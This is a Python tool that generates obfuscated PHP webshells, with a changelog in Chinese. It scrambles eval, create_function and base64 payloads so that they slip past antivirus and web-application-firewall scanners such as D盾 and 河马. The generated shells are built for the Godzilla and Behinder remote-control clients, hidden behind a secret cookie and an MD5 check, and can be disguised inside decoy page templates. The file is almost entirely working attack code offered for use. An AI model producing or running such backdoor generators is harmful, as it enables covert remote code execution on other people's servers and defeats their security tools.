import string
import random
import base64
import sys
from colorama import init
from termcolor import colored
from argparse import ArgumentParser
import os
import time
import hashlib

'''
免杀原理
base64 编码，把关键字符base后，打乱，并添加其他字符
'''
init() # 颜色输出


try:
    def character_encode(str_string, lengths, longchar_characters=""):
        encoding_string = ""
        if longchar_characters == "":
            longchar_characters = "".join(random.sample(string.ascii_letters + string.digits, lengths))  # 生成随机字符
        while True:
            rand_len = int(random.randint(1, 4))  # 返回1到4之间的整数
            if (len(str_string) <= rand_len):
                encoding_string += str_string + longchar_characters
                break
            encoding_string += str_string[:rand_len] + longchar_characters
            str_string = str_string[rand_len:]
        return encoding_string, longchar_characters

    def shuj(vlaue_mauis):
        data = "".join(random.sample(string.ascii_letters, int(vlaue_mauis)))
        return data


    def Lj(php_name, jiami):
        vlaue_mauis = input("输入变量名长度(生成免杀脚本中，变量名的长度)\n：")
        ki = '0123456789'
        if vlaue_mauis == "":
            print(colored('变量名长度输入错误，将使用默认变量名长度', 'red'))
            vlaue_mauis = str(random.randint(4, 10))
        elif vlaue_mauis in ki:
            pass
        else:
            print(colored('变量名长度输入错误，将使用默认变量名长度', 'red'))
            vlaue_mauis = str(random.randint(4, 10))
        print(colored('模块载入成功：', 'green'), colored(jiami, 'red'))
        print(colored('变量名长度輸入成功：', 'green'), colored(vlaue_mauis, 'red'))
        if php_name != None:  # 判断文件名
            if '.php' in php_name:
                print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
            else:
                php_name = php_name + '.php'
                print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
        else:
            if '.php' in php_name:
                print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
            else:
                php_name = php_name + '.php'
                print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
        php_names = php_name
        path = os.path.split(os.path.realpath(__file__))[0]  # 判断系统
        path1 = path[0]
        s = '/'

        lj = input('输入保存shell文件的绝对路径(直接回车就是当前脚本路径)：')
        path1 = path[0]
        l = '/'
        w = '\\'
        if lj == '':
            lj = os.path.split(os.path.realpath(__file__))[0]
            print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
        else:
            lj1 = lj[0]  # 获取第一个值
            lj2 = lj[2]  # 获取第一个值
            abc = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                   'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
                   'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
            if path1 in l:  # 判断系统
                if lj1 in l:  # 判断用户输入的值是否有/ linux
                    print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
                else:
                    lj = '/' + lj
                    print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
            elif lj2 in w:  # 判断D:/的 /
                if lj1 in abc:  # 判断用户输入的值是否有盘符
                    lj_value = len(lj)
                    if lj[lj_value - 1] == w:
                        pass
                else:
                    lj = os.path.split(os.path.realpath(__file__))[0]
                    print(colored('输入错误，讲使用默认路径: ', 'red'), lj)
            else:
                print(colored('路径输入错误', 'red') + ',将使用默认路径')
                lj = os.path.split(os.path.realpath(__file__))[0]
            print(colored('路径载入成功：', 'green'), colored(lj, 'red'))

        lj_value = len(lj)
        if lj[lj_value - 1] == w:
            lj_data = lj + php_name
        elif lj[lj_value - 1] == l:
            lj_data = lj + php_name
        else:
            if path1 in s:
                php_name = '/' + php_name
            else:
                php_name = '\\' + php_name
            lj_data = lj + php_name

        print(colored('路径拼接成功：', 'green'), colored(lj_data, 'red'))
        if jiami == 'a' or jiami == 'A':  # 判断请求过来的是扫描加密的格式
            return post_eval(lj_datas=lj_data, php_names=php_name, vlaue_mauis=vlaue_mauis)
        elif jiami == 'b' or jiami == 'B':
            return php_xor_base64(lj_datas=lj_data, php_names=php_name, vlaue_mauis=vlaue_mauis)
        elif jiami == 'c' or jiami == 'C':
            return php_xor_raw(lj_datas=lj_data, php_names=php_name, vlaue_mauis=vlaue_mauis)
        elif jiami == 'd' or jiami == 'D':
            return php_default_aes(lj_datas=lj_data, php_names=php_name, vlaue_mauis=vlaue_mauis)
        elif jiami == 'e' or jiami == 'E':
            return php_aes_with_magic(lj_datas=lj_data, php_names=php_name, vlaue_mauis=vlaue_mauis)
        elif jiami == 'f' or jiami == 'F':
            return php_default_xor_base64(lj_datas=lj_data, php_names=php_name, vlaue_mauis=vlaue_mauis)


    def variable(vlaue_mauis):
        r_e_p = shuj(vlaue_mauis=vlaue_mauis)
        r_e_p_1 = shuj(vlaue_mauis=vlaue_mauis)
        rep = shuj(vlaue_mauis=vlaue_mauis)
        vla = shuj(vlaue_mauis=vlaue_mauis)
        basek = shuj(vlaue_mauis=vlaue_mauis)
        datak = shuj(vlaue_mauis=vlaue_mauis)
        funck = shuj(vlaue_mauis=vlaue_mauis)
        p_1 = shuj(vlaue_mauis=vlaue_mauis)
        p_2 = shuj(vlaue_mauis=vlaue_mauis)
        p_3 = shuj(vlaue_mauis=vlaue_mauis)
        pkk = shuj(vlaue_mauis=vlaue_mauis)
        vla_2k = shuj(vlaue_mauis=vlaue_mauis)
        vla_3k = shuj(vlaue_mauis=vlaue_mauis)
        aak = shuj(vlaue_mauis=vlaue_mauis)
        bbk = shuj(vlaue_mauis=vlaue_mauis)
        cookies_name = shuj(vlaue_mauis=vlaue_mauis)
        return r_e_p, r_e_p_1, rep, vla, basek, datak, funck, p_1, p_2, p_3, pkk, vla_2k, vla_3k, aak, bbk, cookies_name


    def md5_m():
        keys = input("输入密钥：")
        if keys == "":
            print(colored('输入为空，将使用默认key', 'red'))
            keys = ''.join(random.sample(string.ascii_letters + string.digits, random.randint(6, 15)))
            hl = hashlib.md5()
            hl.update(keys.encode(encoding='utf8'))
            md5 = hl.hexdigest()
            print("加密结果：" + str(md5))
        else:
            hl = hashlib.md5()
            hl.update(keys.encode(encoding='utf8'))
            md5 = hl.hexdigest()
            print("加密结果：" + str(md5))
        mda = str(md5)
        return mda, keys


    def modo(if_a, webshelldata):
        if if_a == 'c' or if_a == 'b' or if_a == 'e':
            statement = webshelldata
        elif if_a == 'a' or if_a == 'd' or if_a == 'f':  # 写入伪造文件
            a = input("选择伪装（1，2，3，4，5，6，7，666）默认是666：")
            if a == '666' or a == '':  # 默认模板
                statement = webshelldata
            else:
                with open(f'template/{a}.txt', 'r+', encoding='utf-8') as fp:
                    statement = fp.read()
                if a == '1':
                    print('123')
                    statement = statement.replace('{webshelldata}', webshelldata)
                elif a == '2':
                    statement = statement.replace('{webshelldata}', webshelldata)
                elif a == '3':
                    statement = statement.replace('{webshelldata}', webshelldata)
                elif a == '4':
                    ip = input("伪装4需要目标Ip，输入对方服务器ip：")
                    statement = statement.replace('{webshelldata}', webshelldata)
                    statement = statement.replace('{ip}', ip)
                elif a == '5':
                    statement = statement.replace('{webshelldata}', webshelldata)
                elif a == '6':
                    ml = input("此需要一个错误的路径(如： /cs/默认的是/config/)：")
                    if ml == '':
                        ml = '/config/'
                        statement = statement.replace('{webshelldata}', webshelldata)
                        statement = statement.replace('{ml}', ml)
                    else:
                        statement = statement.replace('{webshelldata}', webshelldata)
                        statement = statement.replace('{ml}', ml)
                elif a == '7':
                    ml = input("此需要一个错误的文件(如：/cs/a.php，默认的是：/config/index.php)：")
                    if ml == '':
                        ml = '/config/index.php'
                        statement = statement.replace('{webshelldata}', webshelldata)
                        statement = statement.replace('{ml}', ml)
                    else:
                        statement = statement.replace('{webshelldata}', webshelldata)
                        statement = statement.replace('{ml}', ml)
                else:  # 默认页面
                    statement = f"""{webshelldata}"""
        else:
            pass
        return statement


    def wj(lj_datas, webshelldata, php_names, get_1, fs, if_a, cookie_name="", passwords="", keys=""):
        try:
            with open(lj_datas, "w+", encoding='utf-8') as f:  # 写入没有伪造文件
                statement = modo(if_a=if_a, webshelldata=webshelldata)  # 调用模板
                f.write(statement)
                f.close()
        except FileNotFoundError as error:
            with open('erroe.txt', 'a+', encoding='utf-8') as k:
                k.write('---------------------------------------------------------------------' + '\n')
                php_names = php_names.replace('\\', ' ')
                php_names = php_names.replace('/', ' ')
                k.write(f'文件名: {php_names}\n')
                times = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
                k.write('time：' + str(times) + '\n')
                k.write('error：' + str(error) + '\n\n')
                print(colored('发生未知错误: 文件名 or 文件类型错误 or 路径错误', 'red'))
            sys.exit()
        except Exception as error:
            with open('erroe.txt', 'a+', encoding='utf-8') as k:
                k.write('---------------------------------------------------------------------' + '\n')
                php_names = php_names.replace('\\', ' ')
                php_names = php_names.replace('/', ' ')
                k.write(f'文件名: {php_names}\n')
                times = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
                k.write('time：' + str(times) + '\n')
                k.write('error：' + str(error) + '\n\n')
                print(colored('发生未知错误', 'red'))
            sys.exit()
        with open('success.txt', 'a+', encoding='utf-8') as c:
            print('\n-------------------------- ruoji_webshell_bypass ----------------------------------')
            print('|', colored('path:', 'green'), '     |', colored(lj_datas, 'red'))
            print('-----------------------------------------------------------------------------------')
            print('|', colored('加密方式:', 'green'), ' |', colored(f'{fs}', 'red'))
            print('-----------------------------------------------------------------------------------')
            print('|', colored('get:', 'green'), '      |', colored(f'{get_1}', 'red'))
            print('-----------------------------------------------------------------------------------')
            print('|', colored('password：', 'green'), '|', colored(f'{passwords}', 'red'))
            print('-----------------------------------------------------------------------------------')
            print('|', colored('key:', 'green'), '      |', colored(f'{keys}', 'red'))
            print('-----------------------------------------------------------------------------------')
            print('|', colored('Cookie:', 'green'), '   |', colored(f'{cookie_name}', 'red'))
            print('-----------------------------------------------------------------------------------')
            print('|', colored('注意:', 'green'), '   |', colored('需要填写Cookie的，C需要大写，才行', 'red'))
            print('-----------------------------------------------------------------------------------')
            c.write('-------------------------- ruoji_webshell_bypass ------------------------------' + '\n')
            times = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
            php_names = php_names.replace('\\', ' ')  # 去掉文件名的\
            php_names = php_names.replace('/', ' ')  # 去掉文件名的/
            c.write(f'文件名: {php_names}\n')
            c.write(f'加密方式: {fs}\n')
            c.write('time:' + str(times) + '\n')
            c.write(f'path:{lj_datas}' + '\n')
            c.write(f'get:{get_1}' + '\n')
            c.write(f'password:{passwords}' + '\n')
            c.write(f'key:{keys}' + '\n')
            c.write(f'Cookie:{cookie_name}' + '\n\n')


    # 普通一句话
    def post_eval(lj_datas, php_names, vlaue_mauis):
        variables = variable(vlaue_mauis)
        decode_string = character_encode("base64_decode", 50)
        str_string = character_encode("str_replace", 50)
        fun = character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50)
        ph_1 = character_encode(base64.b64encode("eval($_POST['".encode('utf-8')).decode('utf-8'), 50)
        ph_3 = character_encode(base64.b64encode("']);".encode('utf-8')).decode('utf-8'), 50)

        passwords = ''.join(random.sample(string.ascii_letters + string.digits, random.randint(6, 15)))
        ph_2 = character_encode(base64.b64encode(f"{passwords}".encode('utf-8')).decode('utf-8'), 50)

        c1 = "".join(random.sample(string.ascii_letters, 5))
        d1 = "".join(random.sample(string.ascii_letters, 5))

        passwords_s = f'{c1}[]=2&{d1}[]=1&{passwords}'  # post数据包
        cookie_name = input('输入连接的cookie：')
        if cookie_name == '':
            print(colored('cookie输入为空，将使用默认cookie', 'red'))
            cookie_name = ''.join(random.sample(string.ascii_letters + string.digits, random.randint(6, 15)))
        cookie_repos = variables[15] + '=' + cookie_name
        print(colored(f'随机cookie生成成功：', 'green'), colored(cookie_name, 'red'))
        print(colored(f'随机密码生成成功：', 'green'), colored(passwords_s, 'red'))
        get_1 = f"?{variables[11]}[]=2&{variables[12]}[]=1"

        vlue_1 = "".join(random.sample(string.ascii_letters, 5))
        vlue_2 = "".join(random.sample(string.ascii_letters, 5))
        zh_1 = "".join(random.sample(string.ascii_letters, 5))
        name_x_1 = "".join(random.sample(string.ascii_letters, 5))
        name_z_1 = "".join(random.sample(string.ascii_letters, 5))
        n_0 = "".join(random.sample(string.ascii_letters, 5))
        n_1 = "".join(random.sample(string.ascii_letters, 5))
        echo_1 = "".join(random.sample(string.ascii_letters, 5))
        echo_2 = "".join(random.sample(string.ascii_letters, 5))

        webshelldata = '<?php' + f' if ($_COOKIE[\'{variables[15]}\'] == "{cookie_name}") ' + '{' + f"""
    ${variables[13]}='str_';
    ${variables[14]}=${variables[13]}.'replace';
    ${variables[0]}=substr(${variables[14]},6);
    ${variables[1]}='zxcszxctzxcrzxc_zxcrzxcezxc';
    if ($_GET['{variables[11]}'] !== $_GET['{variables[12]}'] && @md5($_GET['{variables[11]}']) === @md5($_GET['{variables[12]}']))""" + "{" + f"""
    ${variables[3]} = 'str_re';
    ${variables[1]}=substr_replace('zxc',${variables[3]},${variables[1]});
    """ + "}" + "else{die();}" + f"""
    ${variables[0]}=${variables[1]}.${variables[0]};
    ${variables[2]} = ${variables[0]}("{str_string[1]}", "", "{str_string[0]}");
    ${variables[4]} = ${variables[2]}("{decode_string[1]}", "", "{decode_string[0]}");
    ${variables[6]} = ${variables[4]}(${variables[2]}("{fun[1]}", "", "{fun[0]}"));
    ${variables[7]} = ${variables[4]}(${variables[2]}("{ph_1[1]}", "", "{ph_1[0]}"));
    ${variables[8]} = ${variables[4]}(${variables[2]}("{ph_2[1]}", "", "{ph_2[0]}"));
    ${variables[9]} = ${variables[4]}(${variables[2]}("{ph_3[1]}", "", "{ph_3[0]}"));
    @${vlue_1} = ${variables[7]};
    @$${vlue_1} = ${variables[8]};
    @${zh_1}=${vlue_1}.$${vlue_1};
    @${vlue_2}=${zh_1};
    @$${vlue_2}=${variables[9]};
    @${name_x_1}=${vlue_2};
    @${name_z_1}=$${vlue_2};
    @${n_0} = ${variables[6]}('${echo_1},${echo_2}','return "${echo_1}"."${echo_2}";');
    @${n_1}=${n_0}(${name_x_1},${name_z_1});
    @${variables[10]} = ${variables[6]}("", ${n_1});
    @${variables[10]}();
    """ + "} " + "?>"
        wj(lj_datas=lj_datas, webshelldata=webshelldata, php_names=php_names, get_1=get_1, passwords=passwords_s,
           fs='eval_post&哥斯拉eval_xor_base64，蚁剑', if_a='c', cookie_name=cookie_repos)


    # 哥斯拉
    def php_xor_base64(lj_datas, php_names, vlaue_mauis):
        variables = variable(vlaue_mauis)
        md5_1 = md5_m()
        mda = md5_1[0]
        keys = md5_1[1]
        key_gesla = mda[:16]  # 因为key是取前16的MD5值
        passwords = ''.join(random.sample(string.ascii_letters + string.digits, random.randint(6, 15)))
        decode_string = character_encode("base64_decode", 50)
        str_string = character_encode("str_replace", 50)
        fun = character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50)
        pauload_gsl_1 = "@session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i < strlen($D);$i++) {$c = $K[$i+1&15];$D[$i] = $D[$i]^$c;}return $D;}"
        pauload_gsl_2 = f"$pass='{passwords}';$payloadName='payload';$key='{key_gesla}';"
        ph_1 = character_encode(base64.b64encode(pauload_gsl_1.encode('utf-8')).decode('utf-8'), 50)
        ph_2 = character_encode(base64.b64encode(pauload_gsl_2.encode('utf-8')).decode('utf-8'), 50)
        ph_3 = character_encode(base64.b64encode(
            "if (isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if (isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if (strpos($payload,\"getBasicsInfo\")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if (strpos($data,\"getBasicsInfo\")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}".encode(
                'utf-8')).decode('utf-8'), 50)
        cookie_name = input('输入连接的cookie：')
        if cookie_name == '':
            print(colored('cookie输入为空，将使用默认cookie', 'red'))
            cookie_name = ''.join(random.sample(string.ascii_letters + string.digits, random.randint(6, 15)))
        cookie_repos = variables[15] + '=' + cookie_name
        print(colored(f'随机密码生成成功：', 'green'), colored(passwords, 'red'))
        print(colored(f'随机cookie生成成功：', 'green'), colored(cookie_name, 'red'))
        get_1 = f"?{variables[11]}[]=1&{variables[12]}[]=2"
        webshelldata = '<?php' + f' if ($_COOKIE[\'{variables[15]}\'] == "{cookie_name}") ' + '{' + f"""
        ${variables[13]}='str_';
        ${variables[14]}=${variables[13]}.'replace';
        ${variables[0]}=substr(${variables[14]},6);
        ${variables[1]}='zxcszxctzxcrzxc_zxcrzxcezxc';
        if ($_GET['{variables[11]}'] !== $_GET['{variables[12]}'] && @md5($_GET['{variables[11]}']) === @md5($_GET['{variables[12]}']))""" + "{" + f"""
        	${variables[3]} = 'str_re';
        	${variables[1]}=substr_replace('zxc',${variables[3]},${variables[1]});
        """ + "}" + "else{die();}" + f"""
        ${variables[0]}=${variables[1]}.${variables[0]};
        @${variables[2]} = ${variables[0]}("{str_string[1]}", "", "{str_string[0]}");
        ${variables[4]} = ${variables[2]}("{decode_string[1]}", "", "{decode_string[0]}");
        ${variables[6]} = ${variables[4]}(${variables[2]}("{fun[1]}", "", "{fun[0]}"));
        ${variables[7]} = ${variables[4]}(${variables[2]}("{ph_1[1]}", "", "{ph_1[0]}"));
        ${variables[8]} = ${variables[4]}(${variables[2]}("{ph_2[1]}", "", "{ph_2[0]}"));
        ${variables[9]} = ${variables[4]}(${variables[2]}("{ph_3[1]}", "", "{ph_3[0]}"));
        ${variables[5]} = ${variables[7]}.${variables[8]}.${variables[9]};
        @${variables[10]} = ${variables[6]}("", ${variables[5]});
        @${variables[10]}();
    """ + "} " + "?>"
        wj(lj_datas=lj_datas, webshelldata=webshelldata, php_names=php_names, get_1=get_1, passwords=passwords,
           keys=keys,
           fs='哥斯拉_php_xor_base64', if_a='b', cookie_name=cookie_repos)


    # 哥斯拉
    def php_xor_raw(lj_datas, php_names, vlaue_mauis):
        variables = variable(vlaue_mauis)
        md5_1 = md5_m()
        mda = md5_1[0]
        keys = md5_1[1]
        key_gesla = mda[:16]
        decode_string = character_encode("base64_decode", 50)
        str_string = character_encode("str_replace", 50)
        fun = character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50)
        pauload_gsl_1 = "@session_start();@set_time_limit(0);@error_reporting(0); function encode($D,$K){for($i=0;$i"
        pauload_gsl_2 = "< strlen($D);$i++) {$c = $K[$i+1&15];$D[$i] = $D[$i]^$c;}return $D;}$payloadName='payload';" + f"$key='{key_gesla}';" + "$data=file_get_contents(\"php://input\");if ($data!==false){$data=encode($data,$key);"
        ph_1 = character_encode(base64.b64encode(pauload_gsl_1.encode('utf-8')).decode('utf-8'), 50)
        ph_2 = character_encode(base64.b64encode(pauload_gsl_2.encode('utf-8')).decode('utf-8'), 50)
        ph_3 = character_encode(base64.b64encode(
            "if (isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if (strpos($payload,\"getBasicsInfo\")===false){$payload=encode($payload,$key);}eval($payload);echo encode(@run($data),$key);}else{if (strpos($data,\"getBasicsInfo\")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}".encode(
                'utf-8')).decode('utf-8'), 50)
        cookie_name = input('输入连接的cookie：')
        if cookie_name == '':
            print(colored('cookie输入为空，将使用默认cookie', 'red'))
            cookie_name = ''.join(random.sample(string.ascii_letters + string.digits, random.randint(6, 15)))
        cookie_repos = variables[15] + '=' + cookie_name
        passwords = ''.join(random.sample(string.ascii_letters + string.digits, random.randint(6, 15)))
        print(colored(f'随机密码生成成功：', 'green'), colored(passwords, 'red'))
        print(colored(f'随机cookie生成成功：', 'green'), colored(cookie_name, 'red'))
        get_1 = f"?{variables[11]}[]=1&{variables[12]}[]=2"
        webshelldata = '<?php' + f' if ($_COOKIE[\'{variables[15]}\'] == "{cookie_name}") ' + '{' + f"""
    ${variables[13]}='str_';
    ${variables[14]}=${variables[13]}.'replace';
    ${variables[0]}=substr(${variables[14]},6);
    ${variables[1]}='zxcszxctzxcrzxc_zxcrzxcezxc';
    if ($_GET['{variables[11]}'] !== $_GET['{variables[12]}'] && @md5($_GET['{variables[11]}']) === @md5($_GET['{variables[12]}']))""" + "{" + f"""
    	${variables[3]} = 'str_re';
    	${variables[1]}=substr_replace('zxc',${variables[3]},${variables[1]});
    """ + "}" + "else{die();}" + f"""
    ${variables[0]}=${variables[1]}.${variables[0]};
    @${variables[2]} = ${variables[0]}("{str_string[1]}", "", "{str_string[0]}");
    ${variables[4]} = ${variables[2]}("{decode_string[1]}", "", "{decode_string[0]}");
    ${variables[6]} = ${variables[4]}(${variables[2]}("{fun[1]}", "", "{fun[0]}"));
    ${variables[7]} = ${variables[4]}(${variables[2]}("{ph_1[1]}", "", "{ph_1[0]}"));
    ${variables[8]} = ${variables[4]}(${variables[2]}("{ph_2[1]}", "", "{ph_2[0]}"));
    ${variables[9]} = ${variables[4]}(${variables[2]}("{ph_3[1]}", "", "{ph_3[0]}"));
    ${variables[5]} = ${variables[7]}.${variables[8]}.${variables[9]};
    @${variables[10]} = ${variables[6]}("", ${variables[5]});
    @${variables[10]}();
    """ + "} " + "?>"
        wj(lj_datas=lj_datas, webshelldata=webshelldata, php_names=php_names, get_1=get_1, passwords=passwords,
           keys=keys,
           fs='哥斯拉_php_xor_raw', if_a='a', cookie_name=cookie_repos)


    # 冰蝎
    def php_default_aes(lj_datas, php_names, vlaue_mauis):
        variables = variable(vlaue_mauis)
        decode_string = character_encode("base64_decode", 50)
        str_string = character_encode("str_replace", 50)
        fun = character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50)
        ph_1 = character_encode(base64.b64encode(
            '@error_reporting(0);function Decrypt($data){$key="e45e329feb5d925b"; '.encode('utf-8')).decode('utf-8'),
                                50)
        ph_2 = character_encode(base64.b64encode(
            'return openssl_decrypt(base64_decode($data), "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING);}$post=Decrypt(file_get_contents("php://input"));eval($post);'.encode(
                'utf-8')).decode('utf-8'), 50)
        get_1 = f"?{variables[11]}[]=1&{variables[12]}[]=2"
        webshelldata = '<?php' + f"""
${variables[13]}='str_';
${variables[14]}=${variables[13]}.'replace';
${variables[0]}=substr(${variables[14]},6);
${variables[1]}='zxcszxctzxcrzxc_zxcrzxcezxc';
if ($_GET['{variables[11]}'] !== $_GET['{variables[12]}'] && @md5($_GET['{variables[11]}']) === @md5($_GET['{variables[12]}']))""" + '{' + f"""
	${variables[3]} = 'str_re';
	${variables[1]}=substr_replace('zxc',${variables[3]},${variables[1]});
""" + "}else{ die();}" + f"""
${variables[0]}=${variables[1]}.${variables[0]};
${variables[2]} = ${variables[0]}("{str_string[1]}", "", "{str_string[0]}");
${variables[4]} = ${variables[2]}("{decode_string[1]}", "", "{decode_string[0]}");
${variables[6]} = ${variables[4]}(${variables[2]}("{fun[1]}", "", "{fun[0]}"));
${variables[7]} = ${variables[4]}(${variables[2]}("{ph_1[1]}", "", "{ph_1[0]}"));
${variables[8]} = ${variables[4]}(${variables[2]}("{ph_2[1]}", "", "{ph_2[0]}"));
${variables[5]} = ${variables[7]}.${variables[8]};
@${variables[10]} = ${variables[6]}("", ${variables[5]});
@${variables[10]}();
?>
    """
        wj(lj_datas=lj_datas, webshelldata=webshelldata, php_names=php_names, get_1=get_1,
           fs='冰蝎4.0.5_php_default_aes', if_a='d')


    # 冰蝎
    def php_aes_with_magic(lj_datas, php_names, vlaue_mauis):
        variables = variable(vlaue_mauis)
        decode_string = character_encode("base64_decode", 50)
        str_string = character_encode("str_replace", 50)
        fun = character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50)
        ph_1 = character_encode(base64.b64encode(
            '@error_reporting(0);function Decrypt($data){$key="e45e329feb5d925b";$magicNum=hexdec(substr($key,0,2))%16; $data=substr($data,0,strlen($data)-$magicNum);'.encode(
                'utf-8')).decode('utf-8'), 50)
        ph_2 = character_encode(base64.b64encode(
            'return openssl_decrypt(base64_decode($data), "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING);}$post=Decrypt(file_get_contents("php://input")); eval($post);'.encode(
                'utf-8')).decode('utf-8'), 50)
        get_1 = f"?{variables[11]}[]=1&{variables[12]}[]=2"
        webshelldata = '<?php' + f"""
${variables[13]}='str_';
${variables[14]}=${variables[13]}.'replace';
${variables[0]}=substr(${variables[14]},6);
${variables[1]}='zxcszxctzxcrzxc_zxcrzxcezxc';
if ($_GET['{variables[11]}'] !== $_GET['{variables[12]}'] && @md5($_GET['{variables[11]}']) === @md5($_GET['{variables[12]}']))""" + '{' + f"""
	${variables[3]} = 'str_re';
	${variables[1]}=substr_replace('zxc',${variables[3]},${variables[1]});
""" + "}else{ die();}" + f"""
${variables[0]}=${variables[1]}.${variables[0]};
${variables[2]} = ${variables[0]}("{str_string[1]}", "", "{str_string[0]}");
${variables[4]} = ${variables[2]}("{decode_string[1]}", "", "{decode_string[0]}");
${variables[6]} = ${variables[4]}(${variables[2]}("{fun[1]}", "", "{fun[0]}"));
${variables[7]} = ${variables[4]}(${variables[2]}("{ph_1[1]}", "", "{ph_1[0]}"));
${variables[8]} = ${variables[4]}(${variables[2]}("{ph_2[1]}", "", "{ph_2[0]}"));
${variables[5]} = ${variables[7]}.${variables[8]};
@${variables[10]} = ${variables[6]}("", ${variables[5]});
@${variables[10]}();
?>
"""
        wj(lj_datas=lj_datas, webshelldata=webshelldata, php_names=php_names, get_1=get_1,
           fs='冰蝎4.0.5_php_aes_with_magic', if_a='e')


    # 冰蝎
    def php_default_xor_base64(lj_datas, php_names, vlaue_mauis):
        variables = variable(vlaue_mauis)
        decode_string = character_encode("base64_decode", 50)
        str_string = character_encode("str_replace", 50)
        fun = character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50)
        ph_1 = character_encode(base64.b64encode(
            '@error_reporting(0);function Decrypt($data){$key="e45e329feb5d925b"; $bs="base64_"."decode";$after=$bs($data."");'.encode(
                'utf-8')).decode('utf-8'), 50)
        ph_2 = character_encode(base64.b64encode(
            'for($i=0;$i < strlen($after);$i++) {$after[$i] = $after[$i]^$key[$i+1&15]; }return $after;}$post=Decrypt(file_get_contents("php://input"));eval($post);'.encode(
                'utf-8')).decode('utf-8'), 50)
        get_1 = f"?{variables[11]}[]=1&{variables[12]}[]=2"
        webshelldata = '<?php' + f"""
${variables[13]}='str_';
${variables[14]}=${variables[13]}.'replace';
${variables[0]}=substr(${variables[14]},6);
${variables[1]}='zxcszxctzxcrzxc_zxcrzxcezxc';
if ($_GET['{variables[11]}'] !== $_GET['{variables[12]}'] && @md5($_GET['{variables[11]}']) === @md5($_GET['{variables[12]}']))""" + '{' + f"""
	${variables[3]} = 'str_re';
	${variables[1]}=substr_replace('zxc',${variables[3]},${variables[1]});
""" + "}else{ die();}" + f"""
${variables[0]}=${variables[1]}.${variables[0]};
${variables[2]} = ${variables[0]}("{str_string[1]}", "", "{str_string[0]}");
${variables[4]} = ${variables[2]}("{decode_string[1]}", "", "{decode_string[0]}");
${variables[6]} = ${variables[4]}(${variables[2]}("{fun[1]}", "", "{fun[0]}"));
${variables[7]} = ${variables[4]}(${variables[2]}("{ph_1[1]}", "", "{ph_1[0]}"));
${variables[8]} = ${variables[4]}(${variables[2]}("{ph_2[1]}", "", "{ph_2[0]}"));
${variables[5]} = ${variables[7]}.${variables[8]};
@${variables[10]} = ${variables[6]}("", ${variables[5]});
@${variables[10]}();
?>
    """
        wj(lj_datas=lj_datas, webshelldata=webshelldata, php_names=php_names, get_1=get_1,
           fs='冰蝎4.0.5_php_default_xor_base64', if_a='d')

    if __name__ == "__main__":
        name = colored('webshell_bypass_php_5.0 by 弱鸡', 'green')
        name = name + "\n\n交流群：655934283\n\n\n\ngithub：https://github.com/ytMuCheng/ruoji"
        arg = ArgumentParser(description=name)
        arg.add_argument("-p",
                         "--php",
                         help=f"{colored('-p 文件名 or --php 文件名', 'green')}")
        arg.add_argument("-j",
                         "--jsp",
                         help=f"{colored('-j 文件名 or --jsp 文件名', 'green')}")
        arg.add_argument("-c",
                         "--config",
                         help=f"{colored('查看配置 -c 1 or --config 1', 'green')}")
        args = arg.parse_args()
        php = args.php
        jsp = args.jsp
        config = args.config
        i = 0  # 判断有没有调用输出配置文件
        if php != None or jsp != None or config != None:
            if config != None:
                path = os.path.split(os.path.realpath(__file__))[0]  # 获取脚本当前路径
                current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))  # 获取当前时间
                path1 = path[0]
                if path1 == '/':
                    xt = 'linux'
                else:
                    xt = 'windows'
                print(f"""
                |---------------------------------------
                |{colored('php_弱鸡_webshelll免杀生成_5.0', 'red')}
                |哥斯拉_php的一句话，连接方式有三个，其中两个不支持伪造
                |PHP_EVAL_XOR_BASE64支持
                |冰蝎PHP_default_xor_base64和PHP_default_aes支持
                |不支持PHP_aes_with_magic
                |---------------------------------------
                |by 弱鸡
                |版本1.0: 加入了显示页面伪装
                |版本2.0: 加入了自定义文件名以及错误处理
                |        添加了过某些waf
                |版本3.0: 对一些敏感函数加密
                |版本4.0: 修复了使用错误
                |        4.1: 修改了报错问题
                |        4.2: 绕过d盾牌检测
                |        4.3: 绕过河马检测，并添加了严格的密码验证
                |        4.4：修复了代码逻辑问题，并添加了@，防止报错
                |版本5.0: 添加了哥斯拉和冰蝎的免杀       
                |---------------------------------------
                |配置信息
                |默认生成shell文件路径：{path}
                |time：{current_time}
                |系统：{xt}
                |-------------------------------------------
                    """)
                i = 1
            if php != None:
                if i == 1:
                    pass
                else:
                    path = os.path.split(os.path.realpath(__file__))[0]
                    current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
